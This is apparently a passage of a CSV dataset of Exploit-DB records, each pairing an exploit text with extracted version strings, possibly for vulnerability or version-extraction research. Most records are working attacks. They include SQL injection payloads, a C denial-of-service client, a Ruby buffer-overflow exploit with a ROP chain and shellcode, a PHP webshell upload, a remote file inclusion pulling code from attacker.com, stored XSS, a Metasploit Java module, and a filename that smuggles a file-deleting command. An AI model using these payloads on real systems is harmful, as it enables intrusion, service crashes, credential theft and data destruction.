type=""hidden"" name=""link"" value=""encode you link with base64"" /> 	<input type=""hidden"" name=""4b42dc29b4b226460d1b510634e21864"" value=""1"" /></form>     [:::::::::::::::::::::::::::::::::::::: 0x4 ::::::::::::::::::::::::::::::::::::::] >> Misc mega-itec.com ::: mega-itec security team      [:::::::::::::::::::::::::::::::::::::: EOF ::::::::::::::::::::::::::::::::::::::]",['1.6.0 Alpha2'],1
43062,"PHP Melody 2.6.1 - SQL Injection ################################################### [+] Author : Venkat Rajgor [+] Email : Venki9990@gmail.com [+] Vulnerability : SQL injection ################################################### E-mail ID : support@phpsugar.com Download : http://www.phpsugar.com Web : http://www.phpsugar.com Price : $39 USD ################################################### Vulnerable parameter: http://x.x.x.x/playlists.php?playlist= Application : PHPSUGAR PHP Melody version 2.6.1 Vulnerability : PHPSUGAR PHP Melody 2.6.1 SQL Injection ###################################################  Description : In PHPSUGAR PHP Melody CMS 2.6.1, SQL Injection exists via the playlist parameter to playlists.php.  Payload Used : ' UNION SELECT null,concat(0x223c2f613e3c2f64 69763e3c2f6469763e,version(),0 x3c212d2d),null,null,null,null ,null,null,null,null,null-- -",['2.6.1'],1
24145,"Orenosv HTTP/FTP Server 0.5.9 - GET Denial of Service (1) // source: https://www.securityfocus.com/bid/10420/info  Orenosv HTTP/FTP server is prone to a denial of service vulnerability that may occur when an overly long HTTP GET request is sent to the server. When the malicious request is handled, it is reported that both the HTTP and FTP daemons will stop responding.   /****************************/    PoC to crash the server /****************************/  /* Orenosv HTTP/FTP Server Denial Of Service     Version:    orenosv059f     Vendor:    http://hp.vector.co.jp/authors/VA027031/orenosv/index_en.html     Coded and Discovered by:    badpack3t <badpack3t@security-protocols.com>    .:sp research labs:.    www.security-protocols.com    5.25.2004  */  #include <winsock2.h> #include <stdio.h>  #pragma comment(lib, ""ws2_32.lib"")  char exploit[] =  /* 420 A's - looks ugly but owell */ ""GET /AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"" ""AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"" ""AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"" ""AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"" ""AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA HTTP/1.0\r\n\r\n"";  int main(int argc, char *argv[]) {         WSADATA wsaData;         WORD wVersionRequested;         struct hostent  *pTarget;         struct sockaddr_in      sock;         char *target;         int port,bufsize;         SOCKET mysocket;          if (argc < 2)         {                 printf(""Orenosv HTTP/FTP Server DoS by badpack3t\r\n\r\n"", argv[0]);                 printf(""Usage:\r\n %s <targetip> [targetport] (default is 9999)\r\n\r\n"", argv[0]);                 printf(""www.security-protocols.com\r\n\r\n"", argv[0]);                 exit(1);         }          wVersionRequested = MAKEWORD(1, 1);         if (WSAStartup(wVersionRequested, &wsaData) < 0) return -1;          target = argv[1];         port = 9999;          if (argc >= 3) port = atoi(argv[2]);         bufsize = 1024;         if (argc >= 4) bufsize = atoi(argv[3]);          mysocket = socket(AF_INET, SOCK_STREAM, 0);         if(mysocket==INVALID_SOCKET)         {                 printf(""Socket error!\r\n"");                 exit(1);         }          printf(""Resolving Hostnames...\n"");         if ((pTarget = gethostbyname(target)) == NULL)         {                 printf(""Resolve of %s failed\n"", argv[1]);                 exit(1);         }          memcpy(&sock.sin_addr.s_addr, pTarget->h_addr, pTarget->h_length);         sock.sin_family = AF_INET;         sock.sin_port = htons((USHORT)port);          printf(""Connecting...\n"");         if ( (connect(mysocket, (struct sockaddr *)&sock, sizeof (sock) )))         {                 printf(""Couldn't connect to host.\n"");                 exit(1);         }          printf(""Connected!...\n"");         printf(""Sending Payload...\n"");         if (send(mysocket, exploit, sizeof(exploit)-1, 0) == -1)         {                 printf(""Error Sending the Exploit Payload\r\n"");                 closesocket(mysocket);                 exit(1);         }          printf(""Payload has been sent! Check if the webserver is dead.\r\n"");         closesocket(mysocket);         WSACleanup();         return 0; }",['0.5.9'],1
21954,"Microsoft Windows XP/2000/NT 4.0 - RPC Service Denial of Service (4) source: https://www.securityfocus.com/bid/6005/info     The Microsoft Windows RPC service contains a flaw that may allow a remote attacker to cause a denial of service. By sending a specifically malformed packet to TCP port 135, the RPC service will be disabled.     This vulnerability was originally reported to only affect Windows 2000. Microsoft has confirmed that Windows NT 4.0 and XP are also vulnerable.     It has been reported that installation of the provided patch will cause some problems in IIS environments. Specifically, users who are using COM+ in IIS environments may experience problems with ASP transactions.     A variant of this issue has been reported which allegedly affects patched systems. It is apparently possible to trigger this variant by flooding a system with malformed packets.  https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/21954.rar","['XP/2000/NT', 'NT', '4.0', 'XP']",1
45414,"Faleemi Plus 1.0.2 - Denial of Service (PoC) # Exploit Title: Faleemi Plus 1.0.2 - Denial of Service (PoC)   # Author: Gionathan ""John"" Reale # Discovey Date: 2018-09-14 # Software Link: http://support.faleemi.com/fsc776/Faleemi_Plus_v1.0.2.exe # Tested Version: 1.0.2 # Tested on OS: Windows 10 # Steps to Reproduce: Run the python exploit script, it will create a new  # file with the name ""exploit.txt"" just copy the text inside ""exploit.txt"" # and start the program. Now click ""Add Camera"" and in the new  # window paste the content of ""exploit.txt"" into the following fields: # ""Camera name"" & ""DID number"". Click ""Add"" and you will see a crash.  #!/usr/bin/python     buffer = ""A"" * 2000  payload = buffer try:     f=open(""exploit.txt"",""w"")     print ""[+] Creating %s bytes evil payload.."" %len(payload)     f.write(payload)     f.close()     print ""[+] File created!"" except:     print ""File cannot be created""",['1.0.2'],1
27164,"UBBCentral UBB.Threads 6.3 - 'showflat.php' SQL Injection source: https://www.securityfocus.com/bid/16520/info  UBB.Threads is prone to an SQL-injection vulnerability. This issue is due to a failure in the application to properly sanitize user-supplied input before using it in an SQL query.  Successful exploitation could allow an attacker to compromise the application, access or modify data, or exploit vulnerabilities in the underlying database implementation.  This issue is reported to affect UBB.Threads version 6.3; other versions may also be vulnerable.   http://www.example.com/showflat.php?Cat=&Number=19229%20UNION%20SELECT%201,2%20/*&page=0&view=collapsed&sb=5&o=&fpart=1",['6.3'],1
24821,"PHPGedView 2.5/2.6 - 'Gedrecord.php' Cross-Site Scripting source: https://www.securityfocus.com/bid/11891/info  It is reported that PhpGedView is affected by a cross-site scripting vulnerability. This issue is due to a failure of the application to properly sanitize user-supplied URI input.  This issue could permit a remote attacker to create a malicious URI link that includes hostile HTML and script code. If this link were to be followed, the hostile code may be rendered in the web browser of the victim user. This would occur in the security context of the affected web site and may allow for theft of cookie-based authentication credentials or other attacks.  http://www.example.com/phpgedview/gedrecord.php?pid=<iframe>",['2.5/2.6'],1
22295,"Invision Board 1.1.1 - 'ipchat.php' Remote File Inclusion source: https://www.securityfocus.com/bid/6976/info  Invision Board is prone to an issue that may allow remote attackers to include files located on attacker-controlled servers.  This vulnerability is as a result of insufficient sanitization performed on remote user supplied data used in URI parameters of certain PHP pages.  Under some circumstances, it may be possible for remote attackers to influence the include path for a global configuration file to point to an external file on a remote server.  If the remote file is a malicious file, this vulnerability may be exploited to execute arbitrary system commands in the context of the web server.   http://www.example.com/ipchat.php?root_path=http://www.attacker.com/conf_global.php",['1.1.1'],1
15569,"MP3-Nator - Local Buffer Overflow (SEH) (DEP Bypass) # Exploit Title: Exploit Buffer Overflow MP3-Nator (SEH - DEP BYPASS) # Date: 18-11-2010 # Author: Muhamad Fadzil Ramli - mind1355[at]gmail[dot]com # Credit/Bug Found By: C4SS!0 G0M3S # Software Link: http://www.brothersoft.com/d.php?soft_id=16524&url=http://files.brothersoft.com/mp3_audio/players/mp3nator.zip # Version: 2.0 # Tested on: Windows XP SP3 EN - Latest Update (VMWARE FUSION - Version 3.1.1) # CVE: N/A   #! /usr/bin/env ruby filename = 'crash.plf'  # ./msfpayload windows/exec CMD=calc EXITFUNC=seh R | ./msfencode -e x86/alpha_mixed -b '\x00' -t ruby # [*] x86/alpha_mixed succeeded with size 456 (iteration=1) shellcode = ""\x89\xe3\xda\xcf\xd9\x73\xf4\x58\x50\x59\x49\x49\x49\x49"" + ""\x49\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x37\x51"" + ""\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32"" + ""\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41"" + ""\x42\x75\x4a\x49\x49\x6c\x4d\x38\x4d\x59\x47\x70\x43\x30"" + ""\x47\x70\x43\x50\x4e\x69\x48\x65\x50\x31\x48\x52\x43\x54"" + ""\x4c\x4b\x51\x42\x46\x50\x4e\x6b\x50\x52\x44\x4c\x4c\x4b"" + ""\x50\x52\x46\x74\x4e\x6b\x51\x62\x45\x78\x46\x6f\x4c\x77"" + ""\x43\x7a\x47\x56\x50\x31\x49\x6f\x45\x61\x49\x50\x4e\x4c"" + ""\x47\x4c\x45\x31\x43\x4c\x47\x72\x44\x6c\x51\x30\x4f\x31"" + ""\x48\x4f\x46\x6d\x43\x31\x49\x57\x4b\x52\x4a\x50\x46\x32"" + ""\x43\x67\x4c\x4b\x46\x32\x46\x70\x4e\x6b\x43\x72\x47\x4c"" + ""\x47\x71\x48\x50\x4c\x4b\x47\x30\x43\x48\x4b\x35\x4b\x70"" + ""\x50\x74\x43\x7a\x47\x71\x4e\x30\x42\x70\x4c\x4b\x51\x58"" + ""\x42\x38\x4c\x4b\x42\x78\x51\x30\x46\x61\x48\x53\x49\x73"" + ""\x47\x4c\x43\x79\x4e\x6b\x44\x74\x4e\x6b\x45\x51\x49\x46"" + ""\x46\x51\x49\x6f\x45\x61\x4b\x70\x4c\x6c\x4f\x31\x48\x4f"" + ""\x46\x6d\x43\x31\x4a\x67\x47\x48\x4d\x30\x50\x75\x48\x74"" + ""\x47\x73\x43\x4d\x4a\x58\x45\x6b\x43\x4d\x47\x54\x42\x55"" + ""\x4b\x52\x50\x58\x4c\x4b\x50\x58\x45\x74\x47\x71\x4e\x33"" + ""\x51\x76\x4e\x6b\x44\x4c\x42\x6b\x4e\x6b\x46\x38\x45\x4c"" + ""\x45\x51\x4e\x33\x4e\x6b\x44\x44\x4c\x4b\x46\x61\x4a\x70"" + ""\x4f\x79\x50\x44\x44\x64\x44\x64\x51\x4b\x43\x6b\x51\x71"" + ""\x43\x69\x50\x5a\x42\x71\x4b\x4f\x4d\x30\x46\x38\x43\x6f"" + ""\x50\x5a\x4c\x4b\x47\x62\x48\x6b\x4f\x76\x43\x6d\x43\x5a"" + ""\x43\x31\x4c\x4d\x4e\x65\x48\x39\x45\x50\x47\x70\x47\x70"" + ""\x46\x30\x42\x48\x46\x51\x4e\x6b\x42\x4f\x4e\x67\x49\x6f"" + ""\x4e\x35\x4d\x6b\x4b\x4e\x46\x6e\x44\x72\x4a\x4a\x50\x68"" + ""\x4c\x66\x4a\x35\x4f\x4d\x4f\x6d\x4b\x4f\x48\x55\x47\x4c"" + ""\x47\x76\x43\x4c\x46\x6a\x4d\x50\x4b\x4b\x4d\x30\x44\x35"" + ""\x45\x55\x4f\x4b\x47\x37\x47\x63\x43\x42\x50\x6f\x51\x7a"" + ""\x45\x50\x42\x73\x4b\x4f\x49\x45\x45\x33\x43\x51\x50\x6c"" + ""\x51\x73\x45\x50\x47\x7a\x41\x41""  junk1 	=  'A' * 28  # ROP1 rop1	=  '' rop1	<< [0x71ABDAC3].pack('V')	# PUSH ESP # POP ESI # RETN 	[Module : WS2_32.dll] rop1	<< [0x71ABDC56].pack('V')   # MOV EAX,ESI # POP ESI # RETN 	[Module : WS2_32.dll] rop1	<< ""DEAD""					# PADDING rop1	<< [0x1001595E].pack('V')	# ADD ESP,20 # RETN - xaudio.dll  # VIRTUALPROTECT PARAMETERS params	= '' params	<< [0x7C801AD4].pack('V')	# VirtualProtect params	<< 'WWWW'					# return address [ PARAM #1 ] params	<< 'XXXX'					# lpAddress      [ PARAM #2 ] params	<< 'YYYY'					# Size           [ PARAM #3 ] params	<< 'ZZZZ'					# flNewProtect   [ PARAM #4 ] params	<< [0x5ADA1005].pack('V')	# writeable address params	<< 'BEEF' * 2				# PADDING  # ROP2 - [ PARAM #1 ] rop2	=  '' rop2	<< [0x775D1578].pack('V')	# PUSH EAX # POP ESI # RETN 	[Module : ole32.dll] rop2	<< [0x77C4EC2B].pack('V')	# ADD EAX,100 # POP EBP # RETN 	[Module : msvcrt.dll] rop2	<< ""BEEF""					# PADDING rop2	<< [0x77C4EC2B].pack('V')	# ADD EAX,100 # POP EBP # RETN 	[Module : msvcrt.dll] rop2	<< 'BEEF'					# PADDING rop2	<< [0x77E8416B].pack('V')	# MOV DWORD PTR DS:[ESI+10],EAX # MOV EAX,ESI # POP ESI # RETN 	[Module : RPCRT4.dll] rop2	<< 'BEEF'  # ROP2 - [ PARAM #2 ] rop2	<< [0x775D1578].pack('V')	# PUSH EAX # POP ESI # RETN 	[Module : ole32.dll] rop2	<< [0x77C4EC2B].pack('V')	# ADD EAX,100 # POP EBP # RETN 	[Module : msvcrt.dll] rop2	<< 'BEEF'					# PADDING rop2	<< [0x77157D1D].pack('V') * 4 # INC ESI # RETN 	[Module : oleaut32.dll] rop2	<< [0x77E8416B].pack('V')	# MOV DWORD PTR DS:[ESI+10],EAX # MOV EAX,ESI # POP ESI # RETN 	[Module : RPCRT4.dll] rop2	<< 'BEEF'  # rop2 - [ PARAM #3 ] rop2	<< [0x775D1578].pack('V')	# PUSH EAX # POP ESI # RETN 	[Module : ole32.dll] rop2	<< [0x77E8559E].pack('V')	# XOR EAX,EAX # RETN 	[Module : RPCRT4.dll] rop2	<< [0x77C4EC2B].pack('V')	# ADD EAX,100 # POP EBP # RETN 	[Module : msvcrt.dll] rop2	<< 'BEEF'					# PADDING rop2	<< [0x77C4EC2B].pack('V')	# ADD EAX,100 # POP EBP # RETN 	[Module : msvcrt.dll] rop2	<< 'BEEF'					# PADDING rop2	<< [0x77C4EC2B].pack('V')	# ADD EAX,100 # POP EBP # RETN 	[Module : msvcrt.dll] rop2	<< 'BEEF'					# PADDING rop2	<< [0x77157D1D].pack('V') * 4 # INC ESI # RETN 	[Module : oleaut32.dll] rop2	<< [0x77E8416B].pack('V')	# MOV DWORD PTR DS:[ESI+10],EAX # MOV EAX,ESI # POP ESI # RETN 	[Module : RPCRT4.dll] rop2	<< 'BEEF'  # rop2	- [ PARAM #4 ] rop2	<< [0x775D1578].pack('V')	# PUSH EAX # POP ESI # RETN 	[Module : ole32.dll] rop2	<< [0x77E8559E].pack('V')	# XOR EAX,EAX # RETN 	[Module : RPCRT4.dll] rop2	<< [0x77C4EC1D].pack('V')	# ADD EAX,40 # POP EBP # RETN 	[Module : msvcrt.dll] rop2	<< 'BEEF'					# PADDING rop2	<< [0x77157D1D].pack('V') * 4 # INC ESI # RETN 	[Module : oleaut32.dll] rop2	<< [0x77E8416B].pack('V')	# MOV DWORD PTR DS:[ESI+10],EAX # MOV EAX,ESI # POP ESI # RETN 	[Module : RPCRT4.dll] rop2	<< 'BEEF'  # POINT ESP TO VIRTUALPROTECT rop2	<< [0x7475B960].pack('V')	# XCHG EAX,ESP # RETN 	[Module : MSCTF.dll] nops	= ""\x90"" * 310  junk1	= junk1 + rop1 + params + rop2 + nops + shellcode + 'A' * (4112 - (junk1 + rop1 + params + rop2 + nops + shellcode).length)  seh		=  [0x10019C35].pack('V')	# ADD ESP,41C # RETN - xaudio.dll junk2	=  'C' * (10000 - (junk1 + seh).length) xploit	= junk1 + seh + junk2  File.open(filename,'w') do |fd| 	fd.write xploit 	puts ""file size : #{xploit.length.to_s}"" end",['3.1.1)'],1
36016,"Xpdf 3.02-13 - 'zxpdf' Security Bypass source: https://www.securityfocus.com/bid/49007/info  Xpdf is prone to a security-bypass vulnerability that may allow attackers to perform actions without proper authorization.  Attackers can exploit this issue to bypass security restrictions and perform unauthorized actions; this may aid in launching further attacks.   $ touch y # The unrelated victim file $ gzip -c </dev/null >'"" y "".pdf.gz' # Create a .pdf.gz file $ xpdf '"" y "".pdf.gz' # View it using xpdf Error: May not be a PDF file (continuing anyway) Error: PDF file is damaged - attempting to reconstruct xref table... Error: Couldn't find trailer dictionary Error: Couldn't read xref table rm: cannot remove `/tmp/': Is a directory $ ls -l y # The victim file is gone! ls: cannot access y: No such file or directory",['3.02-13'],1
45740,"Webiness Inventory 2.9 - Arbitrary File Upload # Exploit Title:  Webiness Inventory 2.9 - Arbitrary File Upload # Date: 2018-10-27 # Exploit Author: Boumediene KADDOUR  # Unit: Algerie Telecom R&D Unit # Software Link: https://github.com/webiness/webiness_inventory # Version: 2.9< # Tested on: WAMP windows 10 x64 # CVE: unknown  # Vulnerable Code: https://github.com/webiness/webiness_inventory/blob/master/protected/library/ajax/WsSaveToModel.php  46 foreach ($_FILES as $file) { 47    $fileName = $file['name']; 48    $fileTmp = $file['tmp_name']; 49    $destDir = WsROOT.'/runtime/'.$model; 50 51    $field = key($_FILES); 52 53    // files are upload to ""runtime"" directory create destination directory 54    // if not exist 55    if (!file_exists($destDir)) { 56        mkdir($destDir, 0777, true); 57    } 58 59    // allowed file size is 3MB 60    if ($file['size'] > 3145728) { 61        continue; 62    } 63 64   // remove old file with same name 65    if (file_exists($destDir.'/'.$fileName)) { 66        unlink($destDir.'/'.$fileName); 67    } 68 69    // upload file 70    move_uploaded_file($fileTmp, $destDir.'/'.$fileName); 71    $m->$field= $fileName; 72 }  # Proof Of Concept  POST /webiness_inventory-2.3/protected/library/ajax/WsSaveToModel.php HTTP/1.1 Host: 172.16.122.4 Content-Length: 1838 Accept: */* Origin: http://172.16.122.4 X-Requested-With: XMLHttpRequest User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36 Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryUOOyIF2f26nDrsM7 Referer: http://172.16.122.4/webiness_inventory-2.3/index.php?request=partners/index/ Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.9,fr;q=0.8,fr-FR;q=0.7 Cookie: resolve_ids=0; order_dir_list_by=1A; _csrf=b49cff27d7c0ccd3a8dd5af3813025249dc909f2a20c12efcb7770f945715b06a%3A2%3A%7Bi%3A0%3Bs%3A5%3A%22_csrf%22%3Bi%3A1%3Bs%3A32%3A%224dWxR4kKmI-ZSWJBsigl0tHhdecVhozc%22%3B%7D; language=32d49278f28c78229de164fe79dc13b6adb3c98af2d133240eb1ffc44771ad3da%3A2%3A%7Bi%3A0%3Bs%3A8%3A%22language%22%3Bi%3A1%3Bs%3A2%3A%22en%22%3B%7D; PHPSESSID=h66id6epvp8g1uoshrdog53323 Connection: close  ------WebKitFormBoundaryUOOyIF2f26nDrsM7 Content-Disposition: form-data; name=""model_name""  PartnerModel ------WebKitFormBoundaryUOOyIF2f26nDrsM7 Content-Disposition: form-data; name=""id""  2 ------WebKitFormBoundaryUOOyIF2f26nDrsM7 Content-Disposition: form-data; name=""partner_name""  My crucial Partner ------WebKitFormBoundaryUOOyIF2f26nDrsM7 Content-Disposition: form-data; name=""logo""; filename=""shell.php"" Content-Type: application/octet-stream  <?php system($_GET['cmd']);?> ------WebKitFormBoundaryUOOyIF2f26nDrsM7 Content-Disposition: form-data; name=""id_number""  25 ------WebKitFormBoundaryUOOyIF2f26nDrsM7 Content-Disposition: form-data; name=""tax_number""  225588664477 ------WebKitFormBoundaryUOOyIF2f26nDrsM7 Content-Disposition: form-data; name=""iban""  ------WebKitFormBoundaryUOOyIF2f26nDrsM7 Content-Disposition: form-data; name=""address1""  ------WebKitFormBoundaryUOOyIF2f26nDrsM7 Content-Disposition: form-data; name=""address2""  ------WebKitFormBoundaryUOOyIF2f26nDrsM7 Content-Disposition: form-data; name=""region_state""  ------WebKitFormBoundaryUOOyIF2f26nDrsM7 Content-Disposition: form-data; name=""zip""  ------WebKitFormBoundaryUOOyIF2f26nDrsM7 Content-Disposition: form-data; name=""city""  ------WebKitFormBoundaryUOOyIF2f26nDrsM7 Content-Disposition: form-data; name=""country""  ------WebKitFormBoundaryUOOyIF2f26nDrsM7 Content-Disposition: form-data; name=""email""  ------WebKitFormBoundaryUOOyIF2f26nDrsM7 Content-Disposition: form-data; name=""web""  ------WebKitFormBoundaryUOOyIF2f26nDrsM7 Content-Disposition: form-data; name=""phone_number""  ------WebKitFormBoundaryUOOyIF2f26nDrsM7 Content-Disposition: form-data; name=""""  ------WebKitFormBoundaryUOOyIF2f26nDrsM7 Content-Disposition: form-data; name=""""  ------WebKitFormBoundaryUOOyIF2f26nDrsM7--  # Access your webshell via the below link http://172.16.122.4/webiness_inventory-2.3/runtime/PartnerModel/shell.php?cmd=whoami",['2.9'],1
26958,"Anchor CMS 0.9.1 - Persistent Cross-Site Scripting # Exploit Title	:	AnchorCMS Stored XSS exploit v0.9.1 # Exploit Author:	DURAKIBOX / dn5 # Website		:	halisduraki.com # Email			:	duraki@null.net # Date			:	18.7.2013. # CMS uri		:	http://anchorcms.com/  # Version 		:	AnchorCMS <= 0.9.1  # About the CMS Anchor is a super-simple, lightweight blog system, made to let you just write. It's still a new CMS but it has a lot of options even if it's coded by one person. Inital coder is Visual Idiot. Anchor is open-source project also located on Github.  # About the exploit -> File 	:	article.php file shows article/post page with text written by owners. If owner enable comments for specific post, attacker can execute 	 				malicious content using a comment form. The malicious content could be either JavaScript code, but may also include HTML, Flash etc.                The code is executed over form where ""Name"" field is actual vulnerability.  				As seen in code bellow, the function ""comment_form_url()"" is called through POST action.				 				<form id=""comment"" class=""commentform wrap"" method=""post"" action=""<?php echo comment_form_url(); ?>#comment"">  				The code bellow show us a field which is vulnerable with function ""comment_form_input_name"" 				<p class=""name""> 					<label for=""name"">Your name:</label> 					<?php echo comment_form_input_name('placeholder=""Your name""'); ?> 				</p>	   				\functions\comments.php file contain function for posting comment.  				function comment_form_url() { 					return Uri::to(Uri::current()); 				}   				article.php file also contain a code for showing comments if they are enabled. The most specific one for us is function 				""comment_name()"" which is actual result of exploit. 				<?php if(comments_open()): ?> 						<?php if(has_comments()): ?> 						<ul class=""commentlist""> 							<?php $i = 0; while(comments()): $i++; ?> 								... 									<h2><?php echo comment_name(); ?></h2> 								... 									<span class=""counter""><?php echo $i; ?></span> 							<?php endwhile; ?> 				<?php endif; ?>  # PoC (Proof of Concept) Lets put some assumptions - CMS have original files 						  - Article have comments enabled 						   +++++++++++++++++++++++++++++++  If we comment on article in this way - 	Name 	:	<script>alert(document.cookie)</script> 	Email	:	anything@service.com 	Text 	:	Stored XSS  	RESULT 	:	Who ever access article with comment above will get the same result, a cookie stored in.  If we comment on article in this way - 	Name 	:	<img src=""http://redirect/exploit/"" onerror=window.open(""http://www.example.com"",""szck"",'height=500,width=500');> 	Email 	:	anything@service.com 	Text 	:	Stored XSS  	RESULT  :	Who ever access article with comment above will be redirected to ""example.com"" website.  In both example we see that attacker can execute malicious code over stored-xss so users can infect their self, either expose their cookie over gate which attacker can set-up or download malware from redirected website.  ======================================================= + dn5 | @ludi_zeko | www.halisduraki.com =======================================================",['0.9.1'],1
20865,"Java 7 Applet - Remote Code Execution (Metasploit) ## # This file is part of the Metasploit Framework and may be subject to # redistribution and commercial restrictions. Please see the Metasploit # web site for more information on licensing and terms of use. #   http://metasploit.com/ ##  require 'msf/core' require 'rex'  class Metasploit3 < Msf::Exploit::Remote 	Rank = ExcellentRanking  	include Msf::Exploit::Remote::HttpServer::HTML  	include Msf::Exploit::Remote::BrowserAutopwn 	autopwn_info({ :javascript => false })  	def initialize( info = {} ) 		super( update_info( info, 			'Name'          => 'Java 7 Applet Remote Code Execution', 			'Description'   => %q{ 					This module exploits a vulnerability in Java 7, which allows an attacker to run arbitrary 				Java code outside the sandbox. This flaw is also being exploited in the wild, and there is 				no patch from Oracle at this point. The exploit has been tested to work against: IE, Chrome 				and	Firefox across different platforms. 			}, 			'License'       => MSF_LICENSE, 			'Author'        => 				[ 					'Unknown', # Vulnerability Discovery 					'jduck', # metasploit module 					'sinn3r', # metasploit module 					'juan vazquez', # metasploit module 				], 			'References'    => 				[ 					#[ 'CVE', '' ], 					#[ 'OSVDB', '' ], 					[ 'URL', 'http://blog.fireeye.com/research/2012/08/zero-day-season-is-not-over-yet.html' ], 					[ 'URL', 'http://www.deependresearch.org/2012/08/java-7-0-day-vulnerability-information.html' ] 				], 			'Platform'      => [ 'java', 'win', 'linux' ], 			'Payload'       => { 'Space' => 20480, 'BadChars' => '', 'DisableNops' => true }, 			'Targets'       => 				[ 					[ 'Generic (Java Payload)', 						{ 							'Arch' => ARCH_JAVA, 						} 					], 					[ 'Windows Universal', 						{ 							'Arch' => ARCH_X86, 							'Platform' => 'win' 						} 					], 					[ 'Linux x86', 						{ 							'Arch' => ARCH_X86, 							'Platform' => 'linux' 						} 					] 				], 			'DefaultTarget'  => 0, 			'DisclosureDate' => 'Aug 26 2012' 			)) 	end   	def on_request_uri( cli, request ) 		if not request.uri.match(/\.jar$/i) 			if not request.uri.match(/\/$/) 				send_redirect(cli, get_resource() + '/', '') 				return 			end  			print_status(""#{self.name} handling request"")  			send_response_html( cli, generate_html, { 'Content-Type' => 'text/html' } ) 			return 		end  		paths = [ 			[ ""Exploit.class"" ] 		]  		p = regenerate_payload(cli)  		jar  = p.encoded_jar 		paths.each do |path| 			1.upto(path.length - 1) do |idx| 				full = path[0,idx].join(""/"") + ""/"" 				if !(jar.entries.map{|e|e.name}.include?(full)) 					jar.add_file(full, '') 				end 			end 			fd = File.open(File.join( Msf::Config.install_root, ""data"", ""exploits"", ""CVE-2012-XXXX"", path ), ""rb"") 			data = fd.read(fd.stat.size) 			jar.add_file(path.join(""/""), data) 			fd.close 		end  		print_status(""Sending Applet.jar"") 		send_response( cli, jar.pack, { 'Content-Type' => ""application/octet-stream"" } )  		handler( cli ) 	end  	def generate_html 		html  = ""<html><head></head>"" 		html += ""<body>"" 		html += ""<applet archive=\""Exploit.jar\"" code=\""Exploit.class\"" width=\""1\"" height=\""1\"">"" 		html += ""</applet></body></html>"" 		return html 	end  end",['7'],1
4705,"Flat PHP Board 1.2 - Multiple Vulnerabilities ---------------------------------------------------------------  ____            __________         __             ____  __    /_   | ____     |__\_____  \  _____/  |_          /_   |/  |_   |   |/    \    |  | _(__  <_/ ___\   __\  ______  |   \   __\  |   |   |  \   |  |/       \  \___|  |   /_____/  |   ||  |    |___|___|  /\__|  /______  /\___  >__|            |___||__|             \/\______|      \/     \/                          ---------------------------------------------------------------  Http://www.inj3ct-it.org 	     Staff[at]inj3ct-it[dot]org   ---------------------------------------------------------------  Flat PHP Board <= 1.2 Multiple Vulnerabilities  ---------------------------------------------------------------  #By KiNgOfThEwOrLd				  --------------------------------------------------------------- Remote User Credentials Disclosure  PoC:  No much to say...an attacker can get his target's informations visiting http:// [target]/[flat_php_board_path]/users/[target_username].php  The informations will be showed in this way:  [username] [password] [email] --------------------------------------------------------------- Multiple Remote Command Executions / File Uploading  PoC:  When we register a new account, flat php board make a file like /users/ [username].php All the fields (Username, Password, Email) are not correctly filtred. Then, an  attacker can executes a malicious code on the vulnerable server.  Exploit:  <? //Usage: 31337.php?targ=http://[target]/[flat_php_board_path] $targ = $_GET['targ']; echo ' <form action=index.php method=post> <input type=hidden name=""username"" value=""../31337""> <input type=hidden name=a value=register2> <input name=""password"" type=hidden value=""r0x""> <input name=""password2"" type=hidden value=""r0x""> <input name=""email"" value=""<?eval(html_entity_decode(stripslashes($_GET [r0x])));?>""> <input type=submit value=""Exploit!""> </form>'; /* This will make a shell in http://[target]/[flat_php_board_path]/31337.php Usage: http://[target]/[flat_php_board_path]/31337.php?r0x=[php_code] */ ?>  Nb. also all the fields of index.php?a=profile is not correctly parsed. --------------------------------------------------------------- Remote Directory Traversal / Source Disclosure  http://[target]/[flat_php_board_path]index.php?a=topic&topic=../[arbitrary php  file]  http://[target]/[flat_php_board_path]index.php?a=viewprofile&username=../ [arbitrary php file] --------------------------------------------------------------- Remote Cookie Manipoulation / Privilege Escalation  PoC:  An attacker can login with an arbitrary account editing the fpb_username  cookie.  In fact, if you try to replace your username with your target username and  refresh, you will be logged in like him. But now, if you try to edit your  profile or something like that, you will generate an error like:  Error with cookies. password/username not correct.  Don't worry, if you go to index.php?a=profile you will find your victim  credentials. Then, viewing the source code you can view your victim password  as:  <td bgcolor=#f9f9f9><font face=""verdana"" size=2>Password:</font></td> <td bgcolor=#f9f9f9><input name=""password"" type=password value=""[password]"" > ></td> ---------------------------------------------------------------	 Ok, i think that's all :S ---------------------------------------------------------------  # milw0rm.com [2007-12-09]","['1.2', '<=']",1
